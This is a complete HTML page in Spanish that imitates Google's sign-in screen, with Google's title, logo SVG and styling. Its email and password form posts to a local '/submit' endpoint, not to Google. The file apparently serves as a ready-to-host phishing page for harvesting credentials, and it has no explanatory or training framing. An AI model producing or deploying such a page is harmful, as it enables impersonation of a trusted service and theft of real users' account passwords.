<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión - Google</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; }
    .container {
      display: flex; flex-direction: column; align-items: center;
      justify-content: center; min-height: 100vh;
    }
    .card {
      border: 1px solid #dadce0; border-radius: 8px;
      padding: 48px 40px 36px; width: 100%; max-width: 450px;
    }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo img { height: 24px; }
    h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
    .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 32px; }
    .form-group { margin-bottom: 24px; position: relative; }
    input[type="email"], input[type="password"] {
      width: 100%; padding: 16px 14px 8px;
      border: 1px solid #dadce0; border-radius: 4px;
      font-size: 16px; outline: none; color: #202124;
      transition: border-color .2s;
    }
    input:focus { border-color: #1a73e8; }
    label {
      position: absolute; top: 14px; left: 14px;
      font-size: 16px; color: #5f6368; pointer-events: none;
      transition: all .2s;
    }
    input:focus + label, input:not(:placeholder-shown) + label {
      top: 4px; font-size: 11px; color: #1a73e8;
    }
    .btn {
      background: #1a73e8; color: #fff; border: none;
      border-radius: 4px; padding: 10px 24px;
      font-size: 14px; font-weight: 500; cursor: pointer;
      float: right; margin-top: 8px;
    }
    .btn:hover { background: #1557b0; }
    .footer { font-size: 12px; color: #5f6368; text-align: center; margin-top: 24px; }
    .separator { border: none; border-top: 1px solid #e0e0e0; margin: 24px 0; }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="logo">
        <!-- SVG del logo de Google -->
        <svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 74 24">
          <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z" fill="#4285F4"/>
          <path d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#EA4335"/>
          <path d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z" fill="#4285F4"/>
          <path d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#FBBC05"/>
          <path d="M58.5 0h2.55v17.46H58.5z" fill="#34A853"/>
          <path d="M65.08 14.48c-1.28 0-2.19-.58-2.78-1.73l7.67-3.17-.26-.65c-.48-1.3-1.96-3.68-4.97-3.68-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.5-2.8 1.5zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z" fill="#EA4335"/>
        </svg>
      </div>

      <h1>Iniciar sesión</h1>
      <p class="subtitle">Continúa en Google</p>

      <form action="/submit" method="POST">
        <div class="form-group">
          <input type="email" id="email" name="email" placeholder=" " required>
          <label for="email">Correo electrónico o teléfono</label>
        </div>
        <div class="form-group">
          <input type="password" id="password" name="password" placeholder=" " required>
          <label for="password">Contraseña</label>
        </div>
        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:16px;">
          <a href="#" style="color:#1a73e8; font-size:14px; text-decoration:none;">¿Olvidaste tu contraseña?</a>
          <button type="submit" class="btn">Siguiente</button>
        </div>
      </form>

      <hr class="separator">
      <div style="text-align:center;">
        <a href="#" style="color:#1a73e8; font-size:14px; text-decoration:none; font-weight:500;">Crear cuenta</a>
      </div>
    </div>
    <div class="footer" style="margin-top:16px;">
      <a href="#">Español (Latinoamérica)</a> &nbsp;
      <a href="#">Ayuda</a> &nbsp;
      <a href="#">Privacidad</a> &nbsp;
      <a href="#">Términos</a>
    </div>
  </div>
</body>
</html>
